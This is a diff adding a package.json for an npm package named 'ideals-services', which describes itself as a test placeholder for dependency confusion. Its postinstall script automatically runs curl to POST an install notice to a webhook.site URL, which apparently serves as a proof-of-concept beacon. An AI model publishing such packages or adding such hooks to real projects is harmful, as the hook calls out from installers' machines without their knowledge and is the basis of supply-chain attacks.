@@ -1,0 +1,11 @@
+{
+  "name": "ideals-services",
+  "version": "1.0.0",
+  "description": "Test placeholder for Dependency Confusion (ideals-services)",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -X POST https://webhook.site/71c16167-e0c2-41fb-a6c8-9f4561f62c3d --data 'package=ideals-services&status=installed'"
+  },
+  "author": "ryel",
+  "license": "MIT"
+}
